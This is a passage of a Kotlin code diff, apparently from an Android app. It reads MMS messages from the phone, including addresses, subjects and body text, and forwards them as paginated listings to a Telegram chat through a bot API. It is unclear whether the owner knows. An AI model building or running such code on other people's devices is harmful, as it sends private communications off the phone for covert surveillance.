+                val dateMs = cursor.getLong(cursor.getColumnIndexOrThrow("date")) * 1000L
+                val subject = cursor.getString(cursor.getColumnIndexOrThrow("sub"))?.takeIf { it.isNotBlank() } ?: "(no subject)"
+                val read = cursor.getInt(cursor.getColumnIndexOrThrow("read"))
+                val box = cursor.getInt(cursor.getColumnIndexOrThrow("msg_box"))
+                val dir = if (box == 1) "📥" else "📤"
+                val readMark = if (read == 0) " 🔵" else ""
+                // Read sender/recipient from mms address table
+                var address = "(unknown)"
+                try {
+                    val addrUri = android.net.Uri.parse("content://mms/$id/addr")
+                    ctx.contentResolver.query(addrUri, arrayOf("address", "type"), null, null, null)?.use { ac ->
+                        while (ac.moveToNext()) {
+                            val addrType = ac.getInt(ac.getColumnIndexOrThrow("type"))
+                            val addrVal = ac.getString(ac.getColumnIndexOrThrow("address"))?.trim() ?: continue
+                            if (addrVal.isNotBlank() && addrVal != "insert-address-token") {
+                                if (box == 1 && addrType == 137) { address = addrVal; break }
+                                if (box != 1 && addrType == 151) { address = addrVal; break }
+                                address = addrVal
+                            }
+                        }
+                    }
+                } catch (_: Throwable) {}
+                // Read body text from mms part table
+                var body = ""
+                try {
+                    val partUri = android.net.Uri.parse("content://mms/$id/part")
+                    ctx.contentResolver.query(partUri, arrayOf("ct", "text"), null, null, null)?.use { pc ->
+                        while (pc.moveToNext()) {
+                            val ct = pc.getString(pc.getColumnIndexOrThrow("ct")) ?: ""
+                            if (ct == "text/plain") {
+                                body = pc.getString(pc.getColumnIndexOrThrow("text"))?.take(200) ?: ""
+                                break
+                            }
+                        }
+                    }
+                } catch (_: Throwable) {}
+                sb.append("${offset + count + 1}. $dir <b>${htmlEsc(address.take(30))}</b>$readMark\n")
+                sb.append("   📌 <i>${htmlEsc(subject.take(60))}</i>\n")
+                if (body.isNotBlank()) sb.append("   ${htmlEsc(body.take(100))}\n")
+                sb.append("   🕐 ${fmtTime(dateMs)}\n\n")
+                count++
+                if (sb.length > 3500) { sb.append("…"); break }
+            } while (cursor.moveToNext() && count < pageSize)
+            cursor.close()
+            val rows = mutableListOf<List<Pair<String, String>>>()
+            val nav = mutableListOf<Pair<String, String>>()
+            if (offset > 0) nav.add("◀️ Prev" to "mms_pg:${(offset - pageSize).coerceAtLeast(0)}")
+            if (offset + pageSize < total) nav.add("Next ▶️" to "mms_pg:${offset + pageSize}")
+            if (nav.isNotEmpty()) rows.add(nav)
+            val markup = if (rows.isNotEmpty()) TelegramApiClient.inlineKeyboard(rows) else null
+            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
+            else sendMessage(sb.toString(), replyMarkup = markup)
+        } catch (e: Exception) {
+            val msg = "❌ Could not read MMS: ${htmlEsc(e.message ?: "")}"
+            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg) else sendMessage(msg)
+        }
+    }
 }
